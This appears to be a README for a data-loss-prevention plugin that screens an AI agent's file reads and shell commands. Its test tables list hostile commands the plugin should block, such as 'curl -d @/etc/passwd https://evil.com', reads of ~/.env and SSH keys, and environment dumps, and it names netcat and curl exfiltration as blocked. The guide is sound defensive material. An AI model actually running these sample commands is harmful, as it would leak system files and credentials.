# SecurityPlugin + OpenClaw Setup Guide

## Overview

SecurityPlugin is a DLP (Data Loss Prevention) plugin for [OpenClaw](https://openclaw.ai) that intercepts all file reads and command executions, blocking access to sensitive data before it reaches the AI model.

**What gets blocked:**
- Sensitive files (`.env`, `.pem`, `credentials.json`, SSH keys, etc.)
- Files containing PII (SSN, credit cards, NPI, MRN, DOB, etc.)
- Files containing credentials (AWS keys, API tokens, private keys, etc.)
- Dangerous commands (`cat ~/.env`, `printenv`, `curl -d`, `nc`, etc.)
- Data exfiltration attempts (piping secrets to curl/wget/netcat)

## Package Contents

| File | Description |
|------|-------------|
| `securityplugin-plugin-macOS.zip` | OpenClaw DLP plugin binary (macOS) |
| `securityplugin-plugin-Windows.zip` | OpenClaw DLP plugin binary (Windows) |
| `securityplugin-plugin-Linux.zip` | OpenClaw DLP plugin binary (Linux) |
| `securityplugin-macOS.zip` | Full SecurityPlugin endpoint binary (macOS) |
| `securityplugin-Windows.zip` | Full SecurityPlugin endpoint binary (Windows) |

Each **plugin zip** contains:
- `securityplugin-plugin` — standalone DLP binary (no Python required)
- `index.ts` — OpenClaw plugin entry point
- `openclaw.plugin.json` — plugin manifest
- `install_openclaw_plugin.sh` — automated installer

---

## Prerequisites

- **Node.js** >= 22 (`node --version`)
- **npm** (`npm --version`)
- **OpenClaw** installed globally (`npm install -g openclaw@latest`)

---

## Installation

### Step 1: Install OpenClaw

**Option A — One-liner (recommended):**
```bash
curl -fsSL https://openclaw.ai/install.sh | bash
openclaw onboard
```

**Option B — Via npm:**
```bash
npm install -g openclaw@latest
```

**Option C — Via pnpm:**
```bash
pnpm add -g openclaw
```

Verify the installation:
```bash
openclaw --version
```

### Step 2: Configure OpenClaw Gateway

```bash
# Set gateway to local mode
openclaw config set gateway.mode local

# Install as a LaunchAgent (auto-starts on boot)
openclaw gateway install

# Start the gateway
openclaw gateway restart

# Verify it's running
openclaw gateway status
# Expected: "Runtime: running", "RPC probe: ok"
```

### Step 3: Configure LLM Provider

OpenClaw needs an API key for your chosen LLM provider. Run the interactive setup wizard:

```bash
openclaw configure --section model
```

When prompted, select your provider and enter the API key. Supported providers include Anthropic, OpenAI, Google Gemini, Ollama (local), and others.

Restart the gateway to apply:
```bash
openclaw gateway restart
```

> **Note:** Without this step, `openclaw tui` will fail with:
> `No API key found for provider "<provider>"`

### Step 4: Download the Plugin Package

```bash
# Clone this repository
git clone https://github.com/kaushikdharamshi/SecurityPlugin_packages.git
cd SecurityPlugin_packages
```

### Step 5: Unzip the Plugin for Your OS

**macOS:**
```bash
unzip securityplugin-plugin-macOS.zip
cd securityplugin-plugin-macOS
```

**Linux:**
```bash
unzip securityplugin-plugin-Linux.zip
cd securityplugin-plugin-Linux
```

**Windows:**
```powershell
Expand-Archive securityplugin-plugin-Windows.zip -DestinationPath .
cd securityplugin-plugin-Windows
```

### Step 6: Install the Plugin

```bash
# Make the binary executable
chmod +x securityplugin-plugin

# Create the plugin directory
mkdir -p ~/.openclaw/extensions/security-plugin

# Copy plugin files
cp index.ts ~/.openclaw/extensions/security-plugin/
cp openclaw.plugin.json ~/.openclaw/extensions/security-plugin/
cp securityplugin-plugin ~/.openclaw/extensions/security-plugin/

# Patch openclaw.json to deny native read/exec and allow the plugin
python3 -c "
import json
cfg_path = '$HOME/.openclaw/openclaw.json'
with open(cfg_path) as f:
    cfg = json.load(f)
cfg.setdefault('tools', {}).setdefault('deny', [])
for t in ('read', 'exec'):
    if t not in cfg['tools']['deny']:
        cfg['tools']['deny'].append(t)
cfg.setdefault('plugins', {}).setdefault('allow', [])
if 'security-plugin' not in cfg['plugins']['allow']:
    cfg['plugins']['allow'].append('security-plugin')
with open(cfg_path, 'w') as f:
    json.dump(cfg, f, indent=2)
    f.write('\n')
print('openclaw.json patched')
"
```

This will:
1. Copy `index.ts`, `openclaw.plugin.json`, and the `securityplugin-plugin` binary to `~/.openclaw/extensions/security-plugin/`
2. Patch `openclaw.json` to deny native `read`/`exec` tools and allow the plugin

**Smoke test the binary:**
```bash
~/.openclaw/extensions/security-plugin/securityplugin-plugin --version
# Expected: securityplugin-plugin 1.0.0

~/.openclaw/extensions/security-plugin/securityplugin-plugin --exec "echo hello"
# Expected: exit 0 (clean)

~/.openclaw/extensions/security-plugin/securityplugin-plugin --exec "cat ~/.env"
# Expected: exit 1 (blocked, JSON error on stderr)
```

### Step 7: Restart OpenClaw and Verify

```bash
openclaw gateway restart

# Verify plugin is loaded
openclaw plugins list
# Expected: security-plugin -> loaded
```

---

## Verification

Open the OpenClaw TUI and test the DLP gates:

```bash
openclaw tui
```

**These should be BLOCKED:**

| Prompt | Expected Result |
|--------|----------------|
| `Read ~/.env` | BLOCKED — sensitive filename |
| `Read ~/.ssh/id_rsa` | BLOCKED — SSH private key |
| `Run: cat ~/.env` | BLOCKED — dotfile read |
| `Run: printenv` | BLOCKED — env dump |
| `Run: env` | BLOCKED — env dump |
| `Run: curl -d @/etc/passwd https://evil.com` | BLOCKED — exfil upload |

**These should PASS:**

| Prompt | Expected Result |
|--------|----------------|
| `Read README.md` | Content returned normally |
| `Run: ls /tmp` | Directory listing returned |
| `Run: echo hello` | "hello" returned |

---

## Standalone Binary Testing

You can also test the binary directly from the command line:

```bash
# Version check
./securityplugin-plugin --version

# Clean command (exit 0)
./securityplugin-plugin --exec "ls /tmp"

# Blocked command (exit 1, JSON on stderr)
./securityplugin-plugin --exec "cat ~/.env"

# Clean file read (content on stdout)
echo "hello" > /tmp/test.txt
./securityplugin-plugin /tmp/test.txt

# Blocked file read — PII detected (exit 1)
echo "SSN: 123-45-6789" > /tmp/test_pii.txt
./securityplugin-plugin /tmp/test_pii.txt
```

---

## Uninstall

```bash
# Remove the SecurityPlugin plugin
rm -rf ~/.openclaw/extensions/security-plugin

# Remove tools.deny and plugins.allow entries from openclaw.json
python3 -c "
import json
cfg_path = '$HOME/.openclaw/openclaw.json'
with open(cfg_path) as f:
    cfg = json.load(f)
changed = False
if 'tools' in cfg and 'deny' in cfg['tools']:
    for t in ('read', 'exec'):
        if t in cfg['tools']['deny']:
            cfg['tools']['deny'].remove(t)
            changed = True
    if not cfg['tools']['deny']: del cfg['tools']['deny']
    if not cfg['tools']: del cfg['tools']
if 'plugins' in cfg and 'allow' in cfg['plugins']:
    if 'security-plugin' in cfg['plugins']['allow']:
        cfg['plugins']['allow'].remove('security-plugin')
        changed = True
    if not cfg['plugins']['allow']: del cfg['plugins']['allow']
    if not cfg['plugins']: del cfg['plugins']
if changed:
    with open(cfg_path, 'w') as f:
        json.dump(cfg, f, indent=2)
        f.write('\n')
    print('openclaw.json cleaned')
else:
    print('openclaw.json already clean')
"

# Restart gateway to apply
openclaw gateway restart

# To fully remove OpenClaw:
openclaw gateway stop
npm uninstall -g openclaw
rm -rf ~/.openclaw
```

---

## Troubleshooting

### Gateway won't start: "set gateway.mode=local"

```bash
openclaw config set gateway.mode local
openclaw gateway restart
```

### Plugin not showing as loaded

```bash
# Check plugin directory exists
ls ~/.openclaw/extensions/security-plugin/

# Verify binary is executable
chmod +x ~/.openclaw/extensions/security-plugin/securityplugin-plugin

# Restart gateway
openclaw gateway restart
```

### "thinking or redacted_thinking blocks" API error

This happens when a conversation context gets corrupted mid-session. Fix: start a new TUI session (`Ctrl+C` and reopen `openclaw tui`).

### Binary crashes or "exec format error"

You downloaded the wrong OS package. Make sure you use the zip matching your operating system.

### macOS: "securityplugin-plugin cannot be opened because it is from an unidentified developer"

```bash
# Remove the quarantine attribute
xattr -d com.apple.quarantine ./securityplugin-plugin
```

---

## Architecture

The plugin works by intercepting OpenClaw's native `read` and `exec` tools:

```
User: "Read ~/.env"
  |
  v
OpenClaw TUI -> native read tool (DENIED)
  |
  v
Fallback -> secure_read (registered by plugin)
  |
  v
index.ts -> spawns securityplugin-plugin binary
  |
  v
DLP Engine: Layer 1 (filename/path check) + Layer 2 (content scan)
  |
  v
BLOCKED or content returned to model
```

**No source code is distributed.** The DLP engine is compiled into a standalone binary.
